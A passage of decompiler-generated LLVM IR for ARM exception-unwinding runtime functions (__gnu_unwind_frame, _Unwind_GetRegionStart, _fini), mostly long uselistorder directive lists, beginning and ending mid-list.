60, 61, 62, 63, 40, 23, 41, 24, 42, 395, 396, 397, 64, 65, 66, 118, 119, 120, 121, 67, 68, 69, 70, 71, 72, 333, 339, 340, 341, 342, 334, 335, 336, 337, 338, 343, 344, 345, 346, 347, 25, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 363, 365, 359, 360, 361, 362, 364, 366, 75, 76, 3, 77, 33, 112, 113, 367, 368, 369, 370, 371, 320, 321, 322, 323, 238, 239, 240, 241, 242, 34, 315, 316, 317, 318, 319, 230, 231, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 26, 30, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 2, 310, 311, 27, 43, 295, 0, 296, 297, 312, 313, 314, 73, 74, 114, 115, 116, 117, 329, 330, 331, 332, 324, 325, 326, 327, 328, 78, 79, 80, 81, 82, 83, 122, 123, 124, 44 }
  uselistorder label %dec_label_pc_23160, { 1, 0 }
  uselistorder label %dec_label_pc_230fc, { 1, 0 }
  uselistorder label %dec_label_pc_230a8, { 1, 0 }
  uselistorder label %dec_label_pc_23080, { 1, 0 }
  uselistorder label %dec_label_pc_22fec, { 1, 0 }
  uselistorder label %dec_label_pc_22fd0, { 1, 0 }
  uselistorder label %dec_label_pc_22fb4, { 1, 0 }
  uselistorder label %dec_label_pc_22f64, { 1, 0 }
  uselistorder label %dec_label_pc_22f48, { 1, 0 }
  uselistorder label %dec_label_pc_22ec4, { 1, 0 }
  uselistorder label %dec_label_pc_22ea8, { 1, 0 }
  uselistorder label %dec_label_pc_22de4, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_22db4, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_22d9c, { 1, 0 }
  uselistorder label %dec_label_pc_22d80, { 1, 0 }
  uselistorder label %dec_label_pc_22ae4.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_22c0c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_22c00, { 0, 2, 1 }
  uselistorder label %dec_label_pc_22bf4, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_22ba4, { 1, 0 }
  uselistorder label %dec_label_pc_22b94, { 1, 0 }
  uselistorder label %dec_label_pc_22b20, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_231e8 = add i32 %ucbp, 76
  %v2_231e8 = inttoptr i32 %v1_231e8 to i32*
  %v3_231e8 = load i32, i32* %v2_231e8, align 4
  %v1_231ec = add i32 %v3_231e8, 4
  %v2_231ec = inttoptr i32 %v1_231ec to i32*
  %v3_231ec = load i32, i32* %v2_231ec, align 4
  %v3_231f4 = mul i32 %v3_231ec, 256
  %v4_231fc = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_231f4, i32* %v4_231fc, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_2321c = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_2321c

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 103, 91, 29, 30, 31, 32, 92, 97, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 90, 95, 61, 62, 63, 98, 64, 99, 100, 65, 101, 66, 96, 102, 67, 68, 70, 69, 71, 72, 73, 74, 0, 93, 1, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 89, 94, 88, 85, 86, 87 }
  uselistorder i32 4, { 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 115, 467, 468, 469, 470, 471, 5, 474, 475, 472, 473, 476, 6, 477, 478, 479, 480, 7, 497, 8, 481, 482, 483, 484, 485, 9, 486, 10, 487, 488, 489, 490, 491, 492, 493, 11, 494, 149, 495, 496, 498, 499, 500, 501, 12, 502, 13, 14, 15, 217, 282, 283, 218, 16, 17, 284, 285, 286, 287, 150, 288, 289, 297, 299, 300, 116, 301, 302, 303, 95, 304, 307, 151, 308, 309, 310, 311, 312, 313, 18, 314, 152, 117, 315, 153, 0, 1, 154, 320, 352, 353, 118, 119, 354, 155, 156, 157, 355, 356, 121, 357, 120, 358, 263, 19, 20, 97, 359, 360, 361, 333, 334, 231, 232, 305, 306, 226, 227, 228, 503, 229, 230, 321, 322, 323, 324, 325, 326, 327, 328, 329, 21, 330, 331, 332, 298, 22, 362, 23, 363, 401, 290, 24, 25, 26, 364, 27, 507, 113, 99, 28, 29, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 30, 525, 526, 527, 528, 529, 530, 100, 531, 532, 533, 534, 535, 536, 31, 32, 114, 537, 342, 122, 340, 341, 335, 336, 337, 338, 339, 365, 366, 367, 368, 369, 370, 371, 372, 373, 96, 374, 375, 376, 377, 380, 343, 344, 345, 346, 347, 349, 33, 350, 123, 351, 378, 379, 316, 317, 318, 319, 381, 158, 291, 292, 293, 294, 295, 296, 34, 233, 234, 235, 236, 35, 237, 538, 267, 223, 159, 124, 160, 540, 36, 541, 161, 224, 225, 539, 107, 238, 239, 278, 279, 280, 281, 162, 404, 405, 406, 108, 407, 163, 164, 243, 165, 166, 244, 37, 245, 246, 98, 38, 240, 167, 241, 168, 103, 242, 268, 169, 269, 270, 273, 274, 275, 276, 104, 410, 411, 412, 413, 414, 415, 170, 171, 39, 416, 417, 418, 419, 420, 421, 422, 423, 172, 408, 409, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 173, 174, 175, 438, 439, 442, 445, 440, 441, 125, 176, 443, 79, 444, 446, 447, 448, 450, 177, 41, 40, 449, 178, 179, 180, 402, 42, 43, 44, 45, 46, 181, 400, 182, 348, 382, 47, 48, 49, 50, 2, 506, 51, 52, 183, 80, 53, 54, 184, 55, 185, 186, 187, 188, 383, 384, 56, 385, 189, 386, 387, 388, 127, 389, 390, 126, 190, 391, 392, 393, 394, 395, 396, 81, 191, 397, 399, 192, 193, 398, 219, 247, 248, 249, 250, 105, 504, 505, 220, 57, 58, 82, 83, 84, 59, 60, 61, 85, 62, 63, 194, 64, 251, 252, 128, 253, 129, 254, 130, 255, 256, 257, 131, 258, 132, 259, 260, 86, 195, 133, 261, 134, 87, 196, 135, 101, 136, 262, 137, 88, 197, 138, 102, 264, 109, 265, 110, 266, 111, 112, 89, 65, 139, 198, 199, 200, 201, 202, 203, 204, 205, 142, 140, 221, 143, 66, 206, 141, 67, 222, 148, 68, 69, 106, 70, 71, 90, 207, 271, 272, 208, 277, 209, 91, 92, 72, 73, 74, 145, 144, 146, 93, 210, 147, 211, 94, 212, 213, 75, 403, 76, 77, 78, 451, 452, 453, 454, 455, 456, 214, 215, 216, 3, 4 }
  uselistorder i32 76, { 16, 17, 18, 19, 20, 21, 0, 2, 3, 4, 1, 5, 6, 8, 9, 7, 10, 12, 13, 14, 15, 11 }
  uselistorder i32 1, { 855, 1692, 1693, 709, 1697, 1698, 1699, 1700, 739, 1701, 1702, 657, 683, 740, 1694, 1695, 1696, 1703, 710, 1704, 856, 419, 424, 422, 420, 425, 421, 423, 857, 858, 859, 860, 741, 742, 1705, 1706, 641, 863, 862, 861, 196, 198, 197, 199, 201, 200, 866, 865, 864, 282, 743, 744, 467, 1707, 417, 1708, 869, 868, 867, 418, 1709, 1710, 1711, 1712, 871, 870, 462, 464, 465, 463, 466, 714, 729, 872, 730, 715, 1358, 1252, 1359, 873, 170, 173, 172, 176, 175, 171, 177, 174, 1360, 874, 1361, 875, 32, 30, 29, 31, 33, 476, 185, 184, 684, 427, 876, 477, 478, 1362, 1363, 43, 42, 1364, 473, 474, 475, 877, 165, 166, 161, 162, 163, 164, 1365, 634, 1366, 1367, 745, 1368, 1369, 878, 38, 39, 40, 34, 35, 37, 36, 1370, 1371, 1372, 746, 747, 1373, 1374, 1390, 881, 880, 879, 538, 539, 536, 537, 1393, 882, 26, 27, 1394, 685, 1395, 1396, 883, 24, 1397, 884, 23, 363, 364, 885, 302, 301, 304, 303, 886, 887, 540, 1398, 889, 888, 307, 306, 305, 652, 890, 541, 748, 1399, 1400, 1401, 749, 1402, 722, 1403, 1404, 658, 1405, 1406, 893, 892, 891, 543, 542, 544, 545, 894, 548, 547, 546, 1407, 1408, 1409, 1424, 1425, 1426, 1433, 750, 751, 903, 902, 901, 900, 852, 899, 898, 897, 896, 895, 550, 553, 554, 551, 552, 549, 1436, 904, 94, 91, 93, 95, 92, 716, 1473, 1474, 707, 1475, 1476, 1478, 635, 1479, 1480, 752, 702, 701, 754, 1481, 649, 667, 755, 756, 757, 1482, 1483, 1484, 1485, 1486, 1487, 0, 1477, 753, 1488, 711, 910, 842, 909, 908, 907, 906, 905, 222, 219, 220, 221, 1489, 1490, 1491, 1492, 1493, 636, 1494, 911, 371, 368, 370, 367, 366, 372, 369, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 686, 1261, 1262, 915, 914, 913, 912, 308, 309, 311, 310, 1263, 1264, 1265, 1266, 1267, 918, 917, 916, 318, 313, 316, 320, 315, 314, 317, 312, 321, 319, 687, 1495, 688, 1496, 1497, 1498, 1499, 1, 1500, 1501, 1502, 1503, 1504, 1505, 920, 919, 18, 17, 20, 21, 22, 19, 731, 1506, 1507, 1508, 1509, 1510, 921, 375, 374, 376, 377, 668, 1309, 1437, 922, 555, 556, 557, 923, 407, 924, 241, 242, 243, 244, 925, 351, 1511, 1512, 1513, 1514, 1232, 926, 566, 561, 562, 559, 558, 563, 564, 560, 565, 927, 350, 347, 348, 346, 349, 928, 252, 251, 248, 249, 250, 246, 247, 929, 253, 254, 261, 262, 257, 258, 259, 260, 255, 256, 930, 227, 226, 567, 931, 717, 1268, 286, 287, 285, 472, 471, 1713, 689, 758, 1714, 3, 2, 932, 236, 231, 229, 230, 237, 234, 235, 232, 233, 228, 759, 288, 933, 569, 570, 568, 1427, 760, 1428, 1429, 1430, 1431, 1432, 934, 265, 266, 264, 267, 1391, 468, 469, 690, 1515, 1516, 1535, 1536, 937, 936, 935, 291, 289, 290, 292, 659, 708, 660, 1622, 1623, 1624, 1625, 691, 938, 137, 1310, 1311, 135, 136, 1312, 939, 572, 573, 574, 571, 1375, 1376, 1377, 1716, 1379, 1378, 644, 940, 669, 1380, 1537, 670, 1538, 941, 182, 183, 179, 178, 180, 181, 1718, 1719, 1720, 1721, 1722, 1723, 1233, 1724, 1725, 1726, 1727, 1728, 1729, 1234, 843, 943, 942, 96, 100, 102, 98, 97, 99, 101, 103, 105, 104, 1459, 1438, 1457, 1458, 703, 671, 65, 66, 67, 68, 761, 1439, 1440, 1455, 1456, 944, 844, 44, 45, 1447, 1235, 1448, 1449, 1236, 1450, 1451, 1452, 1453, 1454, 47, 48, 49, 51, 54, 52, 50, 53, 46, 55, 1441, 1442, 1443, 762, 1444, 1445, 1446, 945, 579, 577, 580, 575, 582, 576, 578, 581, 583, 1460, 1461, 946, 327, 326, 324, 323, 322, 328, 325, 329, 1381, 1382, 1383, 1384, 947, 294, 295, 293, 297, 296, 298, 672, 692, 1539, 1540, 1541, 763, 1542, 655, 693, 650, 673, 1543, 764, 1544, 1545, 1546, 4, 1547, 642, 1548, 637, 1549, 765, 1550, 1551, 1552, 694, 1553, 960, 959, 958, 957, 956, 955, 954, 953, 952, 951, 950, 949, 845, 948, 382, 393, 381, 383, 389, 386, 384, 387, 385, 394, 395, 390, 388, 391, 392, 1554, 1555, 340, 338, 343, 345, 341, 342, 339, 344, 429, 651, 961, 12, 13, 962, 116, 1462, 1463, 1464, 1465, 1467, 1468, 1469, 1470, 1471, 1472, 674, 963, 585, 584, 586, 589, 587, 588, 590, 1556, 1557, 1558, 216, 215, 217, 218, 964, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 965, 81, 85, 87, 84, 82, 86, 83, 88, 1559, 967, 966, 128, 131, 130, 129, 134, 132, 133, 695, 723, 970, 969, 968, 766, 1392, 971, 404, 1385, 1386, 1387, 1388, 1389, 767, 972, 268, 269, 270, 272, 271, 768, 263, 1269, 973, 225, 224, 769, 1270, 974, 361, 362, 770, 975, 281, 279, 280, 1271, 446, 445, 444, 976, 337, 335, 336, 977, 591, 978, 223, 979, 403, 402, 168, 980, 284, 283, 981, 238, 982, 983, 409, 410, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 771, 1329, 988, 987, 986, 985, 984, 594, 592, 593, 595, 598, 596, 597, 599, 1247, 1248, 989, 447, 448, 449, 450, 451, 1730, 1731, 1732, 772, 1733, 1734, 773, 1735, 992, 991, 990, 452, 455, 461, 454, 459, 458, 453, 460, 456, 457, 993, 373, 774, 994, 600, 601, 602, 995, 609, 607, 608, 606, 603, 604, 605, 996, 356, 357, 355, 358, 354, 998, 997, 1000, 999, 139, 1002, 1001, 154, 1003, 138, 1330, 1006, 1005, 1004, 379, 380, 1007, 203, 205, 204, 206, 675, 1008, 610, 1272, 775, 776, 1273, 1274, 1275, 208, 209, 207, 213, 211, 210, 212, 214, 1009, 434, 437, 435, 436, 433, 432, 430, 431, 638, 645, 1560, 1010, 442, 439, 440, 441, 443, 438, 1349, 1350, 1351, 1352, 1353, 1354, 1011, 612, 611, 618, 621, 613, 620, 616, 617, 614, 615, 619, 622, 623, 624, 415, 653, 1249, 1250, 1251, 1012, 1636, 1637, 1015, 1014, 1013, 399, 400, 1016, 661, 1419, 662, 1420, 1421, 654, 1422, 505, 511, 504, 507, 510, 509, 508, 512, 506, 1423, 1017, 190, 188, 194, 189, 193, 192, 195, 191, 663, 1276, 71, 70, 69, 72, 1331, 696, 1332, 1019, 1018, 76, 74, 73, 80, 78, 79, 77, 75, 1020, 61, 63, 59, 57, 58, 60, 62, 1021, 1022, 1736, 697, 777, 1024, 1023, 1025, 1640, 1643, 1644, 1645, 1026, 513, 518, 519, 517, 516, 520, 514, 515, 1646, 1647, 1648, 1649, 1027, 524, 530, 523, 529, 528, 522, 532, 531, 526, 521, 525, 527, 1641, 1642, 778, 187, 186, 1650, 1651, 1652, 1653, 1654, 1655, 718, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 780, 1664, 1665, 1666, 1667, 1668, 779, 1669, 1670, 1671, 1672, 1673, 1028, 144, 146, 142, 145, 150, 152, 149, 151, 153, 147, 148, 143, 141, 140, 781, 782, 656, 1032, 1031, 1030, 1029, 278, 64, 676, 401, 1033, 416, 1034, 202, 1035, 332, 1036, 625, 1037, 1038, 626, 1039, 1040, 627, 1041, 300, 299, 1042, 334, 333, 1043, 1044, 628, 56, 1045, 408, 1600, 1601, 41, 1047, 1046, 629, 630, 1466, 1048, 1335, 1336, 5, 25, 1561, 1562, 1049, 631, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 16, 677, 1563, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1050, 157, 155, 156, 158, 159, 1618, 1619, 14, 15, 678, 1717, 1435, 1434, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1737, 352, 353, 115, 783, 1051, 712, 1564, 1565, 785, 1566, 1567, 1568, 1569, 1570, 786, 1571, 1572, 1573, 1574, 1575, 787, 1577, 699, 698, 1576, 784, 1578, 1579, 788, 1580, 1581, 1582, 1056, 846, 1055, 1054, 1053, 1052, 121, 119, 120, 124, 117, 118, 125, 126, 122, 127, 123, 1583, 1057, 480, 483, 482, 484, 479, 481, 679, 1058, 90, 89, 1584, 1585, 1586, 273, 275, 274, 276, 713, 643, 1588, 1589, 664, 1590, 1591, 6, 7, 1592, 1594, 646, 1595, 790, 1596, 665, 1593, 789, 1068, 1067, 1066, 1065, 1064, 1063, 1062, 1061, 1060, 1059, 107, 108, 109, 791, 680, 1069, 110, 111, 112, 1587, 724, 847, 1597, 1598, 1599, 1070, 485, 487, 486, 490, 488, 489, 491, 1071, 492, 1278, 792, 1277, 704, 1074, 1073, 1072, 494, 497, 493, 495, 502, 496, 501, 500, 498, 499, 793, 1279, 1075, 1076, 1077, 1078, 1079, 1080, 503, 1081, 160, 1082, 378, 1083, 406, 405, 1084, 470, 1086, 1085, 411, 412, 1087, 396, 1088, 1089, 414, 413, 1090, 277, 1091, 114, 113, 397, 398, 1092, 331, 330, 428, 639, 1715, 240, 239, 1280, 647, 666, 1281, 1282, 1283, 640, 796, 1284, 1285, 1286, 719, 1287, 1288, 1289, 1290, 794, 795, 720, 797, 1097, 1096, 1095, 1094, 1093, 848, 1291, 1292, 1104, 1103, 1102, 1101, 1100, 849, 1099, 1098, 798, 1293, 1294, 1106, 1105, 1295, 1296, 799, 800, 801, 802, 803, 1107, 1297, 1298, 806, 1299, 804, 1300, 1301, 1302, 805, 1303, 807, 632, 1116, 1115, 1114, 1113, 1112, 1111, 1110, 1109, 1108, 360, 1304, 808, 1305, 1306, 1307, 809, 1308, 810, 633, 1125, 1124, 1123, 1122, 1121, 1120, 1119, 1118, 1117, 365, 1313, 1314, 811, 1131, 1130, 1129, 1128, 1127, 1126, 167, 812, 813, 1132, 1315, 814, 1316, 1317, 1318, 1138, 1137, 1136, 1135, 1134, 1133, 169, 1319, 1143, 1142, 1141, 1140, 1139, 1320, 815, 1148, 1147, 1146, 1145, 1144, 816, 817, 818, 1152, 1151, 1150, 1149, 1158, 853, 1157, 1156, 1155, 1154, 1153, 1162, 1161, 1160, 1159, 1333, 819, 1244, 1245, 821, 1246, 820, 1231, 1334, 1171, 1170, 1169, 1168, 1167, 1166, 1165, 1164, 1163, 534, 533, 732, 1337, 1338, 1339, 822, 1340, 1174, 1173, 1172, 1176, 1175, 1177, 733, 1341, 1178, 1181, 1180, 1179, 8, 823, 705, 1183, 1182, 1342, 1185, 1184, 725, 1343, 824, 825, 1345, 1344, 826, 1188, 1187, 1186, 734, 1346, 1347, 827, 828, 829, 1348, 850, 1355, 830, 1189, 726, 831, 832, 1356, 833, 1357, 1197, 1196, 1195, 1194, 1193, 1192, 1191, 1190, 727, 728, 1198, 700, 1602, 1603, 1604, 834, 648, 1605, 1606, 1607, 835, 1608, 1202, 1201, 1200, 1199, 851, 1609, 359, 1610, 1203, 836, 1620, 1206, 1205, 1204, 1621, 28, 736, 1626, 1627, 735, 1628, 1629, 737, 738, 1630, 1631, 1207, 1632, 9, 10, 1635, 1633, 1634, 837, 1210, 1209, 1208, 838, 1638, 1639, 1212, 1211, 1215, 1214, 1213, 1218, 1217, 1216, 1220, 1219, 1674, 1675, 839, 1685, 1686, 706, 1687, 1222, 1221, 721, 11, 1226, 1225, 1224, 1223, 682, 1676, 1677, 1678, 681, 1679, 1683, 1684, 840, 1227, 841, 1680, 1681, 1682, 1228, 245, 1688, 1689, 106, 1690, 1691, 426, 1229, 1230, 535, 854 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_23248 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_23250 = add i32 %tmp1, 72
  %v2_23250 = inttoptr i32 %v1_23250 to i32*
  %v3_23250 = load i32, i32* %v2_23250, align 4
  ret i32 %v3_23250

; uselistorder directives
  uselistorder i32 72, { 36, 37, 0, 38, 31, 32, 28, 29, 1, 2, 4, 8, 5, 9, 6, 10, 7, 11, 35, 19, 20, 18, 21, 22, 23, 24, 25, 26, 13, 14, 15, 16, 12, 17, 3, 27, 33, 34, 30 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 12, 11, 14, 13, 146, 147, 148, 149, 66, 67, 68, 75, 10, 76, 78, 5, 7, 8, 79, 80, 2, 0, 1, 90, 33, 15, 36, 16, 77, 34, 35, 150, 81, 82, 83, 84, 85, 17, 86, 74, 18, 91, 92, 151, 152, 153, 154, 156, 157, 155, 158, 159, 160, 161, 162, 163, 164, 19, 20, 21, 22, 24, 23, 25, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 87, 88, 26, 27, 28, 69, 70, 71, 72, 73, 37, 38, 29, 39, 40, 41, 165, 9, 4, 42, 44, 45, 43, 59, 64, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 3, 30, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 142, 135, 136, 137, 138, 139, 140, 141, 143, 144, 31, 145, 89, 6, 106, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 63, 65, 32 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_23264 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_23264)
  %v31_2326c = load i32, i32* @r0, align 4
  ret i32 %v31_2326c

; uselistorder directives
  uselistorder i32* @r0, {}
  uselistorder void (i32)* @__pseudo_branch, { 19, 114, 107, 108, 109, 110, 111, 112, 113, 115, 116, 117, 86, 87, 88, 89, 90, 67, 68, 69, 58, 59, 60, 118, 74, 75, 76, 77, 78, 79, 70, 71, 72, 73, 80, 81, 56, 57, 91, 82, 83, 84, 85, 61, 62, 63, 64, 65, 66, 20, 21, 22, 23, 24, 25, 119, 36, 37, 38, 39, 40, 41, 3, 4, 124, 125, 126, 127, 128, 129, 130, 120, 134, 135, 136, 137, 0, 1, 42, 43, 26, 27, 28, 92, 93, 50, 51, 52, 53, 54, 55, 98, 99, 121, 122, 123, 2, 44, 45, 46, 29, 30, 31, 32, 33, 34, 47, 48, 49, 131, 132, 133, 100, 101, 102, 103, 104, 105, 138, 94, 95, 96, 97, 35, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 106 }
  uselistorder i32 0, { 510, 509, 593, 594, 3106, 514, 513, 595, 3107, 3108, 3109, 3110, 429, 428, 596, 3111, 3112, 287, 3113, 3115, 3116, 195, 196, 3117, 3118, 3114, 116, 117, 118, 119, 2, 1, 3, 0, 276, 275, 277, 278, 279, 3119, 511, 512, 184, 173, 3120, 3121, 281, 282, 280, 283, 3122, 3123, 3124, 3125, 286, 285, 284, 3126, 3127, 3128, 498, 497, 597, 515, 598, 516, 599, 517, 600, 601, 602, 197, 3129, 531, 530, 3130, 3131, 529, 528, 3132, 603, 526, 527, 524, 525, 523, 522, 3133, 521, 520, 519, 518, 434, 3134, 3150, 3135, 290, 3136, 3137, 3138, 3139, 3140, 3141, 292, 3143, 3144, 288, 289, 3145, 3146, 168, 198, 3147, 3148, 2049, 120, 121, 499, 500, 291, 3142, 3149, 433, 3151, 604, 605, 3152, 533, 532, 293, 3153, 3154, 294, 3155, 3156, 3157, 143, 606, 607, 3158, 295, 3159, 3160, 3161, 296, 3162, 3163, 3164, 3165, 3166, 3167, 3168, 3169, 3170, 3171, 38, 169, 608, 3172, 297, 3173, 3174, 3175, 4, 3176, 3177, 5, 3178, 3179, 6, 2406, 7, 2407, 2408, 2050, 581, 582, 2409, 2410, 2411, 2412, 2413, 2414, 2415, 9, 10, 11, 2416, 2417, 8, 2418, 2419, 2051, 12, 2420, 2421, 39, 2052, 2422, 2423, 2424, 2425, 2426, 2427, 2428, 2429, 137, 136, 298, 299, 300, 2430, 2431, 2432, 13, 2433, 2434, 40, 2435, 2436, 2437, 41, 42, 266, 2438, 2439, 2440, 2441, 43, 267, 609, 2442, 2443, 2444, 2445, 2446, 2447, 44, 2448, 15, 14, 45, 2053, 2449, 2055, 2054, 2450, 2451, 2452, 2453, 2454, 16, 2144, 2145, 2146, 2147, 2148, 2149, 2150, 2151, 2152, 2153, 2056, 2154, 2455, 2456, 2457, 2458, 2459, 17, 2460, 2057, 2461, 2462, 2463, 2464, 268, 269, 610, 2465, 2466, 19, 18, 2467, 2468, 2469, 2470, 2471, 2472, 2473, 2058, 2059, 2474, 2061, 2475, 2476, 2062, 2063, 2477, 2478, 2060, 2479, 2064, 2480, 2065, 2481, 2482, 2483, 2484, 20, 2485, 2486, 2487, 2488, 185, 2489, 301, 2490, 2491, 2492, 2493, 2494, 2495, 2496, 302, 2066, 2069, 2067, 2068, 2497, 2498, 2499, 2500, 2501, 2502, 2503, 2504, 58, 59, 2513, 2514, 2505, 2506, 2507, 2508, 2509, 2510, 2511, 2512, 2515, 303, 2522, 2517, 2518, 2519, 2520, 305, 2521, 304, 2549, 306, 2556, 2557, 2558, 174, 2559, 175, 2560, 176, 2561, 177, 2562, 307, 2563, 2564, 2565, 2566, 2567, 2569, 2570, 2572, 2571, 308, 2573, 21, 186, 3180, 611, 3181, 2574, 309, 2575, 2576, 311, 312, 144, 145, 2577, 310, 2578, 2579, 2580, 2581, 199, 200, 2582, 2583, 2584, 313, 2585, 2586, 501, 2587, 2588, 612, 2589, 2590, 2591, 2592, 2593, 2594, 2595, 122, 2596, 2597, 146, 2625, 2626, 2627, 2628, 2629, 2630, 435, 2631, 2632, 2633, 2643, 2634, 2700, 2729, 2730, 2731, 2642, 314, 201, 2732, 534, 491, 492, 613, 2733, 2734, 2735, 2737, 2738, 2739, 2740, 46, 2741, 2742, 60, 436, 502, 2743, 2744, 2745, 2746, 2749, 2750, 2751, 2754, 2756, 2757, 315, 2758, 2070, 2759, 2747, 2736, 2071, 430, 2072, 2748, 2760, 2761, 2762, 61, 2764, 62, 2763, 202, 2765, 2766, 316, 2155, 2156, 2157, 2158, 2159, 147, 2160, 2161, 317, 2162, 47, 318, 2163, 614, 2164, 2165, 493, 319, 320, 615, 616, 322, 2767, 2768, 2769, 2770, 2771, 323, 321, 617, 618, 2772, 2773, 2774, 2775, 324, 619, 2776, 620, 63, 64, 65, 66, 583, 325, 2777, 178, 2778, 327, 326, 621, 622, 2302, 2303, 437, 187, 2644, 2645, 2646, 2647, 2648, 2779, 2780, 2781, 2782, 2783, 2784, 328, 138, 494, 2785, 2786, 2787, 123, 2649, 623, 2650, 2651, 2652, 2788, 2073, 2789, 2790, 2791, 624, 2792, 2793, 2794, 2074, 2795, 2796, 2797, 2798, 535, 536, 2169, 2170, 625, 2568, 626, 2166, 2635, 2176, 2177, 22, 627, 2167, 203, 628, 3182, 3183, 3184, 23, 24, 204, 205, 206, 3199, 3200, 207, 25, 2168, 208, 209, 2636, 629, 329, 2637, 2638, 2639, 2640, 2641, 210, 334, 337, 339, 338, 330, 331, 332, 336, 333, 335, 2550, 2551, 2552, 2553, 630, 2799, 2800, 2801, 340, 341, 2802, 2806, 2807, 2808, 2809, 2810, 342, 2811, 211, 3016, 3017, 3018, 3019, 344, 343, 345, 3020, 346, 2304, 2305, 170, 67, 3201, 124, 438, 3205, 3206, 68, 2523, 148, 2524, 2525, 2526, 439, 212, 2075, 2812, 69, 213, 2813, 2814, 440, 214, 2076, 442, 2815, 70, 171, 2816, 2817, 441, 3207, 3208, 3209, 3210, 3211, 3212, 3213, 3214, 3215, 3216, 3217, 3218, 3219, 3220, 3221, 3222, 3223, 3224, 3225, 3226, 3227, 3230, 3231, 3232, 3233, 3234, 3235, 3236, 3228, 3229, 3237, 3238, 3239, 3240, 3241, 3242, 3243, 3244, 3245, 3246, 48, 3247, 3248, 3249, 3250, 3251, 49, 3252, 3253, 3254, 3255, 3256, 50, 3257, 3258, 3259, 3260, 3261, 3262, 3263, 3264, 3265, 3266, 3267, 3268, 3269, 3270, 3271, 347, 2653, 2077, 2654, 2693, 2655, 2656, 2690, 631, 632, 2691, 2692, 215, 216, 217, 351, 2657, 349, 2658, 2679, 2672, 2078, 2673, 2674, 2675, 2676, 71, 72, 151, 2677, 2678, 443, 2680, 2681, 2079, 2682, 348, 2683, 73, 74, 150, 2684, 2685, 2080, 2686, 2687, 75, 76, 149, 2688, 350, 2689, 218, 2659, 2081, 2660, 2661, 633, 2662, 2663, 2082, 2664, 2665, 2668, 2666, 2667, 444, 2669, 77, 78, 153, 2670, 2083, 79, 80, 152, 2671, 2694, 2084, 2695, 2696, 2697, 2698, 2699, 2527, 2085, 2528, 2529, 2530, 2531, 2818, 2819, 2820, 2821, 2822, 353, 2823, 2824, 2825, 2826, 2827, 2828, 2829, 2830, 2831, 2832, 2833, 2834, 220, 219, 354, 355, 2835, 2836, 2837, 2838, 2839, 2840, 221, 222, 2841, 2842, 2843, 2844, 2845, 2846, 51, 2847, 2848, 2849, 2850, 2851, 81, 356, 2852, 223, 635, 2853, 2854, 2855, 2856, 2857, 636, 357, 2858, 2859, 2860, 2861, 542, 2862, 2863, 2864, 541, 2865, 2866, 540, 2867, 2868, 352, 2869, 634, 2870, 359, 2871, 52, 2872, 537, 503, 2873, 2874, 2875, 637, 638, 2876, 2877, 2878, 538, 539, 2879, 2880, 2881, 358, 2882, 2883, 2884, 2885, 2886, 2887, 2888, 26, 2889, 2890, 2891, 2086, 2892, 2893, 2894, 2895, 2896, 2897, 2899, 2898, 2900, 2901, 2902, 2903, 2904, 2905, 2906, 2907, 2908, 2909, 2910, 2911, 2916, 2917, 224, 